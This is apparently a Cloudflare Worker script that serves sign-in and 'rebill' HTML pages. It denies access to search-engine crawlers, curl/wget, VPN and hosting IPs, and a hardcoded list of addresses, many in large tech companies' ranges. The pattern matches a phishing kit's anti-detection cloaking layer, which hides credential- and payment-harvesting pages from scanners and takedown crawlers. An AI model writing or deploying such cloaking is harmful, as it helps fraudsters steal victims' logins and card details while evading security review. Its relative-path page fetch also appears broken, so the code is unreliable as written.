addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Step 1: Get user IP address and user-agent
  const ip = request.headers.get('CF-Connecting-IP')
  const userAgent = request.headers.get('User-Agent').toLowerCase()

  // Step 2: Check for bots
  if (isBot(userAgent) || await isVPN(ip) || isBlockedIP(ip)) {
    return new Response('Access Denied: Bot, VPN, or Blocked IP detected', { status: 403 })
  }

  // Step 3: Serve the requested HTML page
  const url = new URL(request.url)

  // Check which page is being requested and serve the static HTML files
  if (url.pathname === '/index.html') {
    return fetchHTML('index.html')
  } else if (url.pathname === '/signin.html') {
    return fetchHTML('signin.html')
  } else if (url.pathname === '/rebill.html') {
    return fetchHTML('rebill.html')
  }

  // Default 404 if no match found
  return new Response('Page not found', { status: 404 })
}

// Function to check if the user-agent belongs to a known bot
function isBot(userAgent) {
  const badHosts = [
    "googlebot", "bingbot", "facebook", "curl", "wget", "bot", "spider", "scraper", "crawler"
  ]
  return badHosts.some(bot => userAgent.includes(bot))
}

// Function to check if the IP is a known VPN (can be enhanced with external services)
async function isVPN(ip) {
  const response = await fetch(`https://ip-api.com/json/${ip}?fields=isp`)
  const data = await response.json()

  // Check if ISP is a VPN service or hosting service
  return data.isp && (data.isp.includes('VPN') || data.isp.includes('Hosting'))
}

// List of blocked IPs
const blockedIps = [
  "89.207.18.182", "173.194.69.147", "149.3.176.145", "66.235.156.128", 
  "173.194.69.125", "173.194.69.120", "173.194.69.102", "173.194.69.95","173.0.88.34",
  "173.194.69.103", "173.194.69.104", "173.194.69.105", "63.245.217.20", "64.62.203.172",
  "173.194.69.113", "173.194.69.138", "173.194.69.139", "173.194.69.100", "173.194.69.101",
  "63.245.217.71", "188.112.175.207", "66.235.139.166", "66.235.138.2", "66.235.138.59",
  "66.235.139.153", "66.235.139.152", "66.235.138.44", "66.235.139.118", "66.235.138.18",
  "66.235.139.121", "66.235.138.19", "66.235.134.160", "66.235.133.8", "66.235.133.52",
  "66.235.133.33", "66.235.132.152", "66.235.133.62", "66.235.132.232", "66.235.132.118",
  "66.235.133.11", "66.235.132.121", "149.20.57.227", "199.48.147.36", "37.59.162.218",
 
  // Add more IPs as needed
]

// Function to check if an IP is in the blocked list
function isBlockedIP(ip) {
  return blockedIps.includes(ip)
}

// Function to fetch HTML content for a given page
async function fetchHTML(pageName) {
  // Fetch the HTML content (assuming it's in the same directory)
  const response = await fetch(`./${pageName}`);  
  const pageContent = await response.text();
  
  return new Response(pageContent, {
    headers: { 'Content-Type': 'text/html' },
  });
}
